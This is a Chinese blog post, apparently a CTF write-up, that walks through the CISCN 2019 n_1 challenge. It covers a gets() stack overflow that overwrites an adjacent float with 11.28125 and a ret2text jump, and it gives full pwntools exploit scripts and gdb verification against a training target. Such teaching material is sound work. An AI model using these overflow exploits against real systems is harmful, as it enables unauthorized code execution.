---
title: "Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证"
date: 2026-11-06 10:00:00
updated: 2026-11-06 10:00:00
categories:
  - CTF
  - Pwn
  - 栈溢出
tags:
  - Pwn
  - 栈溢出
  - gets
  - 浮点数
  - IEEE754
  - pwntools
  - gdb
  - pwndbg
  - CISCN2019
description: 从 file / checksec 到 IDA 伪代码，讲清楚这题为什么不打返回地址而是改写相邻的 float v2：44 字节偏移怎么算、11.28125 为什么在内存里是 00 80 34 41、struct.pack('<f', ...) 和 p32(0x41348000) 是什么关系，最后用 pwntools 的 gdb.debug 单步到 gets 之后，在 xmm0 和栈上确认 payload 真的覆盖成功。
difficulty: 入门
topic: Pwn 入门
series: Pwn 入门
series_order: 3
permalink: 2026/11/06/pwn-ctf-ciscn-2019-n-1/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（做完 [rip](/2026/11/02/pwn-ctf-rip/) 和 [warmup](/2026/11/05/pwn-ctf-warmup-csaw-2016/) 之后，这题正好练调试）
- **考点**：`gets` 栈溢出、覆盖相邻局部变量、IEEE 754 浮点数、`struct.pack`、用 `gdb.debug` 验证 payload
- **工具**：`file`、`checksec`、IDA、gdb + pwndbg、pwntools
- **漏洞点**：`gets(v1)`，`v1` 在 `rbp-0x30`
- **目标变量**：`float v2` 在 `rbp-0x4`，距离 `v1` 起点 `0x2c` = `44`
- **payload**：`44` 个 `A` + `struct.pack('<f', 11.28125)`，一共 `48` 字节
- **关键值**：`11.28125` → `0x41348000` → 小端字节 `00 80 34 41`
- **flag**：`CTF2{37d9a42f-2f01-48ad-841c-9144b9ed20a7}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：C 语言函数调用、栈的基本概念、会用 gdb 和 pwntools（前两篇都讲过）
- **环境**：Linux（Kali / Ubuntu），IDA、gdb + pwndbg、pwntools
- **靶场**：文中的地址是当时平台的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- 本文所有操作仅用于**授权靶场和教学**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`file 看类型` → `checksec 看保护` → `IDA 看 main / func` → `对着汇编确认变量位置` → `算偏移` → `算浮点数的字节` → `写 exp` → `gdb 验证 payload` → `打远程拿 flag`
{% endnote %}

## 先从 file 和 checksec 开始

这道题会让你更深入地理解 gdb 调试：你会明白怎么**测试自己的 payload 是否正常运作**，以及 payload 不按预期走的时候，怎么用调试把问题找出来。

首先还是先用 `file` 和 `checksec` 查看文件：

```bash
file pwn3
```

![file 查看文件类型](image-1.png)

*图 1：`file` 的输出，注意最后是 `not stripped`*

```text
pwn3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped
```

这题**没有 stripped**，是一个可执行文件。别看这一行只差了几个字母，它直接改变了我们的调试体验：

| 输出 | 这题 | 对调试的影响 |
| --- | --- | --- |
| `ELF 64-bit LSB` | 64 位小端 | 地址 8 字节，后面用 `p64` / `struct.pack` |
| `dynamically linked` | 动态链接 | 运行时加载 libc，函数经过 PLT |
| `not stripped` | **符号表还在** | gdb 里可以直接 `disas func`、`b func`，不用像上一题那样先找地址 |
| `for GNU/Linux 2.6.32` | 老内核 | 老题常见的历史痕迹，不影响做题 |

上一题 warmup 是 `stripped`，`main` 的名字被删掉了，我们得先从 IDA 拿地址再反汇编。这题符号表完整，gdb 里敲 `disas func` 就能直接看到汇编，省了一步。

再看保护：

```bash
checksec --file=pwn3
```

![checksec 查看保护](image-2.png)

*图 2：`checksec` 的输出*

```text
[*] '/home/kali/ctf/pwn3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    Stripped: No
```

| 字段 | 本例 | 一句话解释 |
| --- | --- | --- |
| `Arch` | `amd64-64-little` | 64 位小端序 |
| `RELRO` | `Partial RELRO` | GOT 只读了一部分，这题用不上 |
| `Stack` | `No canary found` | 没有金丝雀，溢出可以一路往下写 |
| `NX` | `NX enabled` | 栈不可执行，不能往栈上写 shellcode 再跳过去 |
| `PIE` | `No PIE (0x400000)` | 程序基址固定，地址可以写死 |
| `Stripped` | `No` | 符号表还在，gdb 里能直接用函数名 |

和上一题相比，这题多了 `NX enabled`。但它不影响我们：我们的目标是**改写一个已有的局部变量**，然后让程序自己去执行现成的 `system("cat /flag")`，既不执行栈上的代码，也不需要泄露 libc。

{% note success %}
**保护机制只决定路线，不决定能不能做。** 没有 canary、没有 PIE，意味着我们可以放心地往栈上写；NX 开着也没关系，因为我们从头到尾都在“借用”程序自己的代码。真正要注意的是：这题的溢出目标不是返回地址，而是一个 `float` 变量。
{% endnote %}

## 丢进 IDA 看函数

依旧先丢到 IDA 里，看看有哪些函数。左侧函数窗口里有 `main` 和 `func`，`main` 只做了一件事——调用 `func`：

![main 的伪代码](image-3.png)

*图 3：`main` 里调用 `func()`*

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  func();
  return 0;
}
```

这两行 `setvbuf` 是 CTF 题的标配：

| 参数 | 值 | 含义 |
| --- | --- | --- |
| `stream` | `_bss_start` / `stdin` | 要设置缓冲的流（stdout / stdin） |
| `buf` | `0` | 让库自己分配缓冲区 |
| `mode` | `2` | `_IONBF`，即**不使用缓冲** |
| `size` | `0` | 无缓冲模式下忽略 |

改成无缓冲之后，`puts` 的输出会立刻发出去，`gets` 也会立刻从连接里读，不会因为缓冲区没满而卡住。远程交互时这一点很重要，不然你会觉得“程序怎么没反应”。

真正的题目在 `func` 里：

![func 的伪代码](image-4.png)

*图 4：`func` 里有 `cat /flag`，但要 `v2 == 11.28125` 才肯执行*

```c
int func()
{
  _BYTE v1[44];   // [rsp+0h] [rbp-30h] BYREF
  float v2;       // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    return system("cat /flag");
  else
    return puts("Its value should be 11.28125");
}
```

这段代码的信息量很大，一行一行看：

| 代码 | 作用 | 对做题的意义 |
| --- | --- | --- |
| `_BYTE v1[44];` | 44 字节的字符数组，在 `rbp-0x30` | `gets` 的写入起点 |
| `float v2;` | 4 字节浮点数，在 `rbp-0x4` | **溢出目标** |
| `v2 = 0.0;` | 初始化 | 程序原本期望它一直是 0 |
| `puts("...")` | 打印提示 | 告诉我们该输入了 |
| `gets(v1);` | 读一行，不检查长度 | 漏洞点 |
| `if (v2 == 11.28125)` | 比对一个浮点数 | 满足就执行 `cat /flag` |
| `system("cat /flag")` | 后门 | 目标 |

`gets` 会从 `v1` 开始一直往高地址写，**`v1` 后面紧挨着的就是 `v2`**。也就是说，只要输入超过 44 字节，多出来的部分就会改写 `v2`。这就是整道题的核心。

### 为什么这题不打返回地址

如果你刚做完 rip 和 warmup，第一反应多半是去找“返回地址在哪、偏移多少”。但这道题根本不用碰返回地址。

栈溢出不只有“覆盖返回地址”一种用法。**缓冲区之后、程序之后还会读到的任何变量，都可以是溢出目标。** 这题里 `v1` 和 `v2` 是相邻的：

```text
v1 起点（rbp-0x30）
      ↓
[ v1: 44 字节 ][ v2: 4 字节 ]  ← 正好填满 0x30 的栈帧
                ↑
          rbp-0x4，gets 多写 4 字节就到这里
```

编译器本来可能在两个局部变量之间插填充字节（对齐用），但这里 `44 + 4 = 48 = 0x30`，正好把 `sub rsp, 0x30` 腾出来的空间占满，一个字节的缝隙都没有。题目就是照着“从 `v1` 一路写到 `v2`”设计的。

所以我们的 payload 结构是：

```text
[ 44 个 A：填满 v1 ][ 4 字节：v2 想要的浮点数 ]
```

不用算保存的 rbp，不用算返回地址，也不用管栈对齐——因为程序根本没走到 `ret`，`if` 判断一成立就直接调 `system` 了。

{% note warning %}
**每道题的目标不一样。** rip 和 warmup 要改的是**返回地址**（在 `rbp+8`），这题要改的是**局部变量**（在 `rbp-0x4`）。看到 `gets` 先别条件反射地算到 `rbp+8`，先看看伪代码里“谁会被用来做判断”。
{% endnote %}

## 对着汇编再看一遍

先看看 `func` 的汇编：

![func 的汇编](image-5.png)

*图 5：`disas func` 的输出*

因为程序没有 stripped，gdb 里直接敲：

```text
pwndbg> disas func
```

```asm
0x400676 <+0>:   push rbp
0x400677 <+1>:   mov  rbp, rsp
0x40067a <+4>:   sub  rsp, 0x30
0x40067e <+8>:   pxor xmm0, xmm0
0x400682 <+12>:  movss DWORD PTR [rbp-0x4], xmm0
0x400687 <+17>:  mov  edi, 0x4007b4          ; "Let's guess the number."
0x40068c <+22>:  call 0x400520 <puts@plt>
0x400691 <+27>:  lea  rax, [rbp-0x30]
0x400695 <+31>:  mov  rdi, rax
0x400698 <+34>:  mov  eax, 0
0x40069d <+39>:  call 0x400550 <gets@plt>
0x4006a2 <+44>:  movss xmm0, DWORD PTR [rbp-0x4]
0x4006a7 <+49>:  ucomiss xmm0, DWORD PTR [rip+0x146]   ; 0x4007f4 = 11.28125f
0x4006ae <+56>:  jp   0x4006cf <func+89>
0x4006b0 <+58>:  movss xmm0, DWORD PTR [rbp-0x4]
0x4006b5 <+63>:  ucomiss xmm0, DWORD PTR [rip+0x138]   ; 0x4007f4
0x4006bc <+70>:  jne  0x4006cf <func+89>
0x4006be <+72>:  mov  edi, 0x4007cc          ; "cat /flag"
0x4006c3 <+77>:  mov  eax, 0
0x4006c8 <+82>:  call 0x400530 <system@plt>
0x4006cd <+87>:  jmp  0x4006d9 <func+99>
0x4006cf <+89>:  mov  edi, 0x4007d6          ; "Its value should be 11.28125"
0x4006d4 <+94>:  call 0x400520 <puts@plt>
0x4006d9 <+99>:  nop
0x4006da <+100>: leave
0x4006db <+101>: ret
```

把伪代码和汇编对应起来看，就能确认两件事：`v1` 储存在 `rbp-0x30` 处，`v2` 在 `rbp-0x4` 处。

{% note info %}
**【汇编代码小 tips】Intel 语法和 AT&T 语法**

IDA 和 pwndbg 默认显示的是 **Intel 语法**：操作数**前面是目的，后面是源**，比如 `mov rbp, rsp` 是把 `rsp` 的值给 `rbp`。

gdb 原生默认可能是 **AT&T 语法**，顺序反过来，而且寄存器带 `%`、立即数带 `$`：`mov %rsp, %rbp`。看到这种写法不要慌，在 gdb 里执行：

```text
set disassembly-flavor intel
```

就能切回 Intel 语法。两种语法描述的是同一批指令，只是写法不同。
{% endnote %}

### v2 = 0.0 是怎么写的

```asm
pxor xmm0, xmm0
movss DWORD PTR [rbp-0x4], xmm0
```

`pxor xmm0, xmm0` 把 128 位的 `xmm0` 整个清零（任何数和自己异或都是 0），然后 `movss` 把 `xmm0` 的低 32 位写进 `[rbp-0x4]`，这就是 `v2 = 0.0`。

注意这里是 `movss`（move scalar single，单精度 4 字节），不是 `movsd`（double，8 字节）。**`v2` 只占 4 个字节**，这一点后面打包 payload 时非常关键。

### gets 写到哪里

```asm
lea  rax, [rbp-0x30]
mov  rdi, rax
mov  eax, 0
call gets@plt
```

`lea rax, [rbp-0x30]` 把 `v1` 的地址算出来，`mov rdi, rax` 放进第一个参数寄存器。`mov eax, 0` 是因为 `gets` 是可变参数函数，SysV ABI 要求用 `al` 告诉它“这次传了几个向量寄存器参数”，这里没有，所以清零。

`gets` 不检查长度，从 `rbp-0x30` 开始一直往高地址写，`v2` 就在 `rbp-0x4`，正好是第 45 个字节开始的位置。

### 比较和分支

`gets` 返回之后，编译器是这么比较的：

```asm
movss xmm0, DWORD PTR [rbp-0x4]     ; 读 v2
ucomiss xmm0, DWORD PTR [rip+0x146] ; 和 0x4007f4 处的常量比较
jp   0x4006cf                        ; 无序（NaN）就跳去 else
...
jne  0x4006cf                        ; 不相等也跳去 else
```

几条指令拆开看：

| 指令 / 标志 | 作用 |
| --- | --- |
| `movss` | 把 4 字节浮点数读进 `xmm0` 的低 32 位 |
| `ucomiss` | 无符号比较两个单精度浮点数，结果放在标志位里 |
| `jp` | Parity Flag 置位时跳转，也就是比较结果是“无序”（出现 NaN） |
| `jne` | ZF 为 0 时跳转，也就是两个数不相等 |

C 语言的 `==` 遇到 NaN 必须返回假，所以编译器先 `jp` 把 NaN 的情况挑出去，再 `jne` 判断是否相等。`-O0` 编译出来会有点啰嗦（读了两遍 `v2`、比较了两遍），不用纠结，只要知道**判断的就是 `v2` 这 4 个字节**就够了。

比较用的常量在 `0x4007f4`，后面在 gdb 里可以直接看：

```text
pwndbg> x/fw 0x4007f4
0x4007f4: 11.28125
pwndbg> x/wx 0x4007f4
0x4007f4: 0x41348000
```

`0x41348000` 就是 `11.28125` 在内存里的样子。记住这个值，它就是我们要写进 `v2` 的 4 个字节。

## 算偏移：44 是怎么来的

IDA 的注释已经把答案写在脸上了：

```c
_BYTE v1[44];   // [rsp+0h] [rbp-30h]
float v2;       // [rsp+2Ch] [rbp-4h]
```

两个 `rbp` 相对地址相减：

```text
(rbp - 0x4) - (rbp - 0x30) = 0x2c = 44
```

画成栈图：

```text
        高地址
        +--------------------------+
        |  func 的返回地址 (8)     |  <- rbp + 8
        +--------------------------+
        |  保存的 rbp (8)          |  <- rbp
        +--------------------------+
        |  v2 (4)                  |  <- rbp - 0x4   目标！
        +--------------------------+
        |  v1[44]                  |  <- rbp - 0x30  gets 从这里开始写
        +--------------------------+
        低地址
```

`gets` 从 `v1` 的起点 `rbp-0x30` 开始往高地址写：

- 前 44 个字节填满 `v1`；
- 第 45 个字节开始，写的就是 `v2`；
- `v2` 只有 4 字节，所以再写 4 个字节就正好覆盖完它。

偏移就是 `0x30 - 0x4 = 0x2c = 44`。

### 为什么不是 48

`0x30`（48）是 `sub rsp, 0x30` 给整个局部变量区腾出的空间，`44 + 4 = 48` 正好用完。但 `v2` 是从第 44 个字节**开始**的，我们要的是 `v2` 的起始位置，不是整块空间的末尾。

所以 exp 里的 `PADDING = 44`，payload 总长度是 `44 + 4 = 48`：

```text
[ 44 字节 A ][ 4 字节浮点 ]  = 48 字节
```

这两个数字容易混：

| 数字 | 含义 |
| --- | --- |
| `44` | 填充长度，从 `v1` 起点走到 `v2` 起点 |
| `48` | payload 总长度，44 填充 + 4 字节浮点数 |
| `0x2c` | 44 的十六进制写法 |
| `0x30` | 整个局部变量区的大小，等于 44 + 4 |

{% note info %}
IDA 同时给出了 `[rsp+...]` 和 `[rbp-...]` 两套相对地址，这是因为函数执行过 `sub rsp, 0x30` 之后，`rsp` 和 `rbp` 的关系就固定了：`rsp = rbp - 0x30`。所以 `[rsp+0x2c]` 和 `[rbp-0x4]` 指的是同一个地方。看栈布局时认准 `rbp` 最直观。
{% endnote %}

## 11.28125 在内存里长什么样

偏移算出来了，接下来要解决“怎么写一个浮点数”。`p64` 只能打包整数，浮点数得用 `struct`。

### IEEE 754 单精度

C 的 `float` 按 IEEE 754 单精度存储，一共 32 位：

```text
 1 位符号 | 8 位指数 | 23 位尾数
```

把 `11.28125` 拆开：

```text
11.28125 = 11 + 0.28125
         = 1011.01001₂
         = 1.01101001₂ × 2³
```

- 符号位：正数，`0`；
- 指数位：`3 + 127 = 130 = 10000010₂`（单精度的偏移量是 127）；
- 尾数位：去掉整数部分的 `01101001`，后面补 0 到 23 位。

拼起来：

```text
0 10000010 01101001000000000000000
= 0100 0001 0011 0100 1000 0000 0000 0000
= 0x41348000
```

`0x41348000` 按小端序存进内存，字节顺序是：

```text
00 80 34 41
```

最后那个 `0x41` 正好是字符 `A`，挺巧的，但不是重点。

{% note info %}
**为什么 `11.28125` 能被精确表示？**

`0.28125 = 9/32`，是分母为 2 的幂的分数，转成二进制是有限的 `0.01001₂`，23 位尾数放得下，所以单精度能**精确**存下它，不存在舍入误差，`==` 比较才可靠。

如果题目写的是 `11.1` 这种十进制有限、二进制无限循环的数，float 存进去就有误差，比较时只能近似。CTF 出题人特意挑 `11.28125`，就是为了让“精确相等”成立。
{% endnote %}

### 用 struct.pack 打包

Python 的 `struct` 模块可以直接按 C 的格式打包：

```python
>>> import struct
>>> struct.pack('<f', 11.28125)
b'\x00\x804A'
>>> struct.pack('<f', 11.28125).hex()
'00803441'
```

`b'\x00\x804A'` 就是 4 个字节：`00 80 34 41`（`0x34` 是字符 `4`，`0x41` 是字符 `A`，所以打印出来长得像 `\x804A`）。

想反查它对应的整数位模式：

```python
>>> hex(struct.unpack('<I', struct.pack('<f', 11.28125))[0])
'0x41348000'
```

和 gdb 里 `x/wx 0x4007f4` 看到的一模一样。

### 为什么是 `<f`，不是 `<d`

格式字符串里的每个字符都有含义：

| 部分 | 含义 |
| --- | --- |
| `<` | 小端序（little-endian） |
| `>` | 大端序（big-endian） |
| `f` | C 的 `float`，4 字节单精度 |
| `d` | C 的 `double`，8 字节双精度 |

x86-64 是小端，所以用 `<`。而 `f` 和 `d` 选错，后果很直接：

- `struct.pack('<f', 11.28125)` 得到 4 字节，正好覆盖 `v2`；
- `struct.pack('<d', 11.28125)` 得到 8 字节，会把 `v2` 后面**保存的 rbp** 也写掉；更糟的是，double 的低 4 字节是 `00 00 00 00`，`v2` 反而变成 `0.0`，`if` 直接走 else。

所以这里必须用 `<f`。

```python
>>> struct.pack('<d', 11.28125).hex()
'0000000000902640'   # 8 字节，前 4 个字节还是 0
```

{% note warning %}
**不要用 `p32(1128125)`。** `p32` 打包的是整数 `1128125` 的二进制，不是浮点数的 IEEE 754 表示。想要 4 字节的 `11.28125`，要么 `struct.pack('<f', 11.28125)`，要么直接 `p32(0x41348000)`——后者需要你先手算出位模式，前者更不容易错。
{% endnote %}

## 写 exp

现在开始准备 exp。思路很简单：44 个 `A` 填满 `v1`，后面接 4 字节的浮点数。

```python
from pwn import *
import struct

context.log_level = 'info'

HOST = '752e0d41683080aa9389cc2c.tcp-ctf2.dasctf.com'
PORT = 9999
PADDING = 44

FLOAT = 11.28125
io = remote(HOST, PORT, ssl=True, sni=HOST)

payload = b'A' * PADDING
payload += struct.pack('<f', FLOAT)

log.info(f"Sending Payload ({len(payload)}bytes)")
io.sendline(payload)
io.interactive()
```

逐行拆开看：

| 代码 | 作用 |
| --- | --- |
| `from pwn import *` | 导入 pwntools，`remote`、`log`、`context` 都在里面 |
| `import struct` | 打包浮点数要用到，pwntools 不提供这个功能 |
| `context.log_level = 'info'` | 让 pwntools 打印连接、发送等日志 |
| `HOST` / `PORT` | 靶机地址和端口，按平台给的填 |
| `PADDING = 44` | 从 `v1` 起点走到 `v2` 起点 |
| `FLOAT = 11.28125` | 题目要求的值 |
| `remote(HOST, PORT, ssl=True, sni=HOST)` | 连接靶机；走 TLS 的平台要加 `ssl` 和 `sni` |
| `b'A' * PADDING` | 44 个垃圾字节，填满 `v1` |
| `struct.pack('<f', FLOAT)` | 把浮点数打包成 4 字节小端 |
| `sendline(payload)` | 发送 payload 并补一个换行，`gets` 读到换行就停 |
| `interactive()` | 把终端交给靶机，方便看输出 |

这里添加浮点数的方式是 `struct` 库里的 `pack` 方法，所以需要 `import struct`。`'<f'` 指的是**小端 + 单精度 float**，和 x86-64 的内存布局对应。

payload 一共 `44 + 4 = 48` 字节。

如果你本地想先跑一下，把 `remote(...)` 换成：

```python
io = process('./pwn3')
```

## 你怎么知道 payload 真的按想法走了

你现在拿到 payload 了，但是你怎么知道它是不是真的按你的想法走的呢？

**能打通，不代表你理解对了。** 有时候 payload 碰巧能拿 flag，有时候失败了你也不知道错在偏移还是字节序。最稳的办法是：在本地用 gdb 把 payload 送进去，停在 `gets` 之后，亲眼看 `v2` 有没有变成 `11.28125`。

这一节介绍怎么用 pwntools 进行 gdb 调试。

### 先配终端

`gdb.debug` 会**另开一个终端窗口**运行 gdb，所以要先告诉 pwntools 用什么命令开终端。最常用的是 tmux：

```python
context.terminal = ["tmux", "new-window"]
```

这行要求你当前的 shell 已经在 tmux 会话里。先执行 `tmux` 进入会话，再运行 exp，就会弹出一个新窗口给你调 gdb。

如果不用 tmux，也可以换成别的终端：

```python
# GNOME 桌面
context.terminal = ["gnome-terminal", "--", "bash", "-c"]
# 或者 xterm
context.terminal = ["xterm", "-e", "bash", "-c"]
# tmux 水平分屏，左边跑 exp 右边调 gdb
context.terminal = ["tmux", "splitw", "-h"]
```

哪种都行，能弹出一个能敲 gdb 命令的窗口就可以。

### gdb.debug

开启 gdb 调试的方法很简单：

```python
io = gdb.debug('./pwn3', gdbscript='''
    b *main
    continue
''')
```

前面是你要运行的文件，后面是 gdb 里要执行的命令。`gdbscript` 会在 gdb 启动后自动执行，**注意要打断点**：

- `b *main`：在 `main` 入口下断点；
- `continue`：运行到断点停下来。

如果不打断点，程序会直接跑起来等你输入，你虽然还能交互，但没有机会在中间暂停、看寄存器。打断点的目的是“先把它摁住，再慢慢看”。

完整的调试版 exp：

```python
from pwn import *
import struct

context.log_level = 'info'
context.terminal = ["tmux", "new-window"]

HOST = '752e0d41683080aa9389cc2c.tcp-ctf2.dasctf.com'
PORT = 9999
PADDING = 44

FLOAT = 11.28125

io = gdb.debug('./pwn3', gdbscript='''
    b *main
    continue
''')
# io = remote(HOST, PORT, ssl=True, sni=HOST)

payload = b'A' * PADDING
payload += struct.pack('<f', FLOAT)

log.info(f"Sending Payload ({len(payload)}bytes)")
io.sendline(payload)
io.interactive()
```

跑起来之后，gdb 窗口会停在 `main`：

![停在 main](image-6.png)

*图 6：gdb 停在 `main`，此时还没进入 `func`，payload 也还没被读走*

运行后成功进来了，此时还没到 `func`，所以 payload 还没进来。**注意 `sendline` 只是把数据写进连接的缓冲区，真正读取它的是 `gets`。** 现在程序被断点摁在 `main`，还没走到那里。

### 单步到 gets 之后

接下来打 `func` 的断点，然后 `c`：

```text
pwndbg> b func
pwndbg> c
```

![停在 func](image-7.png)

*图 7：停在 `func` 里，`rsp` 已经减了 `0x30`*

程序停在 `func` 的入口附近。接下来用 `ni`（nexti）一条一条往下走。`ni` 和 `si` 的区别：

| 命令 | 简写 | 行为 |
| --- | --- | --- |
| `nexti` | `ni` | 执行一条指令，**遇到 `call` 不进去**，直接执行到返回 |
| `stepi` | `si` | 执行一条指令，**遇到 `call` 跟进去** |

我们要的是“让 `gets` 执行完，然后停在它后面”，所以用 `ni`。一直 `ni` 到 `call gets@plt` 这一行：

```text
0x40069d <+39>: call 0x400550 <gets@plt>
```

在这里再按一次 `ni`，`gets` 会去读输入。payload 已经由 exp 里的 `sendline` 写进连接的缓冲区，所以 gdb 不会卡住；`gets` 返回后，gdb 停在下一行 `0x4006a2`：

```asm
0x4006a2 <+44>: movss xmm0, DWORD PTR [rbp-0x4]
```

再按一次 `ni`，让这条 `movss` 执行完，`xmm0` 里就是 `v2` 的值，此时停在 `0x4006a7`。

### 看 xmm0

```text
pwndbg> p $xmm0.v4_float[0]
$1 = 11.28125
```

![xmm0 里是 11.28125](image-8.png)

*图 8：`v2` 已经被改写成 11.28125*

`xmm0` 是 128 位的 SSE 寄存器，gdb 可以把它按不同的“视角”解释：

| 写法 | 含义 |
| --- | --- |
| `$xmm0.v4_float[0]` | 当成 4 个 float，取第 0 个 |
| `$xmm0.v4_int32[0]` | 当成 4 个 32 位整数，取第 0 个 |
| `$xmm0.v2_double[0]` | 当成 2 个 double，取第 0 个 |

所以 `p $xmm0.v4_float[0]` 就是“把 `xmm0` 的低 32 位按 float 解释并打印”，结果是 `11.28125`，说明覆盖成功。

如果此时还停在 `0x4006a2`（`movss` 还没执行），`xmm0` 里还是旧值。可以直接看内存：

```text
pwndbg> p *(float*)($rbp-0x4)
$2 = 11.28125
pwndbg> x/wx $rbp-0x4
0x7ffc55f4b08c: 0x41348000
```

这两种写法不依赖 `movss` 有没有执行，更保险。

### 看栈

如果想看栈上的情况，用 pwndbg 的 `telescope` 或 `x`：

```text
pwndbg> telescope $rbp-0x40
pwndbg> x/80bx $rbp-0x40
```

![栈上的注入情况](image-9.png)

*图 9：`telescope` 和 `x/80bx` 都能看到 44 个 A 和后面的浮点数*

先看 `telescope` 的输出（地址因机器而异）：

```text
00:0000 -040  0x7ffc55f4b050 <- 1
01:0008 -038  0x7ffc55f4b058 -> 0x4006a2 (func+44) <- movss xmm0, dword ptr [rbp - 4]
02:0010 -030  0x7ffc55f4b060 <- 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
...
07:0038 -008  0x7ffc55f4b088 <- 0x4134800041414141 /* 'AAAA' */
```

从下往上读：

| 位置 | 值 | 说明 |
| --- | --- | --- |
| `rbp-0x30` 开始 | `41 41 41 ...` | 44 个 `A` 填满 `v1` |
| `rbp-0x8` 这个 8 字节字 | `0x4134800041414141` | 低 4 字节还是 `A`，高 4 字节是浮点数 |
| `rbp-0x4` | `00 80 34 41` | 浮点数 `11.28125`，成功覆盖 |
| `rbp-0x38` | `0x4006a2` | 栈上残留的旧返回地址，不影响 |

`0x4134800041414141` 这个值刚好把“最后 4 个 A”和“浮点数”拼在一个 8 字节里：按小端读，低地址的 4 个字节是 `41 41 41 41`，高地址的 4 个字节是 `00 80 34 41`。

再用 `x/80bx` 一个字节一个字节地看，会更直观：

```text
0x7ffc55f4b060: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
...
0x7ffc55f4b088: 0x41 0x41 0x41 0x41 0x00 0x80 0x34 0x41
```

从 `rbp-0x30` 开始一路都是 `0x41`（字符 `A`），到 `rbp-0x4` 变成 `00 80 34 41`。**这就是我们注入的情况，和预期完全一致。**

再顺手确认一下比较用的常量：

```text
pwndbg> x/fw 0x4007f4
0x4007f4: 11.28125
pwndbg> x/wx 0x4007f4
0x4007f4: 0x41348000
```

常量和我们写进去的字节一模一样，`ucomiss` 比较时自然相等，程序会走 `system("cat /flag")` 分支。

{% note success %}
**调试的目的不是“看个热闹”，而是逐项验证假设：**

1. 偏移 44 对不对 → 看 `rbp-0x30` 之后第 44 个字节是不是浮点数；
2. 字节序对不对 → 看 `rbp-0x4` 是不是 `00 80 34 41`；
3. 有没有写坏别的东西 → 看 `rbp` 和 `rbp+8` 有没有被动过。

三项都对，payload 就是对的，远程打不通也只可能是网络或靶场问题。
{% endnote %}

## 打远程，拿 flag

确认无误后，把 `gdb.debug` 换回 `remote`，运行：

![最终拿 flag](image.png)

*图 10：payload 发送成功，`cat /flag` 直接把 flag 打出来*

输出：

```text
[+] Opening connection to 752e0d41683080aa9389cc2c.tcp-ctf2.dasctf.com on port 9999: Done
[*] Sending Payload (48bytes)
[*] Switching to interactive mode
Let's guess the number.
CTF2{37d9a42f-2f01-48ad-841c-9144b9ed20a7}
[*] Got EOF while reading in interactive
```

flag 是：

```text
CTF2{37d9a42f-2f01-48ad-841c-9144b9ed20a7}
```

`Let's guess the number.` 是程序自己的提示，紧接着就是 `cat /flag` 的输出——没有 `$` 提示符，因为后门执行的是 `cat /flag`，不是 `/bin/sh`。执行完程序继续往下走，连接断开，pwntools 打印 `Got EOF`，这是正常收尾。

{% note info %}
**顺带一个细节：`gets` 会自动补一个 `\0`。**

我们发了 48 字节，`gets` 会在第 49 个位置（也就是 `rbp`）补一个 `\0`，把保存的 rbp 最低字节清零。返回地址在 `rbp+8`，没有被碰，所以 `system` 能正常执行、flag 能正常打印；但 `func` 返回之后 `main` 的收尾可能会踩到这个被改脏的 rbp，进程最后怎么退出就不一定很干净了。

**这不影响拿 flag**，看到 `Got EOF` 不用怀疑 exp。反过来说，如果你想验证自己真的理解了栈布局，可以想想“为什么第 49 个字节会落在 rbp 上”——答案是 `v1` 从 `rbp-0x30` 开始，`rbp-0x30 + 48 = rbp`。
{% endnote %}

## 另一种打法：直接跳过判断

题目本意是让我们改 `v2`，但既然能溢出，其实还有一条路：**不猜数字，直接把返回地址改成 `system` 那段代码**。

回头看汇编，`0x4006be` 就是 `system("cat /flag")` 的入口：

```asm
0x4006be <+72>: mov edi, 0x4007cc   ; "cat /flag"
0x4006c3 <+77>: mov eax, 0
0x4006c8 <+82>: call system@plt
```

跳到 `0x4006be`，就绕过了前面所有比较。返回地址在 `rbp+8`，从 `v1` 起点算是：

```text
0x30（到 rbp）+ 8（跳过保存的 rbp）= 0x38 = 56
```

exp 改成：

```python
from pwn import *

context.log_level = 'info'

HOST = '752e0d41683080aa9389cc2c.tcp-ctf2.dasctf.com'
PORT = 9999

io = remote(HOST, PORT, ssl=True, sni=HOST)

payload = b'A' * 56
payload += p64(0x4006be)
log.info(f"Sending Payload ({len(payload)}bytes)")
io.sendline(payload)
io.interactive()
```

payload 是 `56 + 8 = 64` 字节：

```text
[ 56 字节填充 ][ 0x4006be ]
```

为什么不担心栈对齐？因为我们是 `ret` 到 `0x4006be` 的，`ret` 之后 `rsp % 16 == 0`，而 `call system` 要求的正是 `call` 前 `rsp % 16 == 0`，刚好满足。这一点和 rip / warmup 里“跳函数入口要处理 `push rbp`”不同：我们跳的是**函数中间**，不执行 `push rbp`，对齐天然是对的。

两条路的对比：

| 路线 | payload | 依赖 | 教学意义 |
| --- | --- | --- | --- |
| 改 `v2` | 44 + 4 = 48 字节 | 浮点数的 IEEE 754 表示 | 理解“溢出不一定打返回地址” |
| 改返回地址跳 `0x4006be` | 56 + 8 = 64 字节 | 程序 No PIE、地址固定 | 理解“跳过判断”的 ret2text 思路 |

{% note warning %}
**第二种打法只在 No PIE 时好用。** 如果程序开了 PIE，`0x4006be` 每次运行都会变，得先泄露基址。第一种打法不依赖任何地址，只依赖变量的相对位置，通用性更强，也是出题人想考的点。
{% endnote %}

## 新手常见问题

{% note info **Q1：偏移为什么是 44，不是 48？** %}
`48`（`0x30`）是整个局部变量区的大小，`44 + 4` 正好用完。但 `v2` 从 `rbp-0x4` 开始，距离 `v1` 起点 `rbp-0x30` 是 `0x2c = 44` 字节。填充 44 字节之后，接下来写的 4 字节才落在 `v2` 上。
{% endnote %}

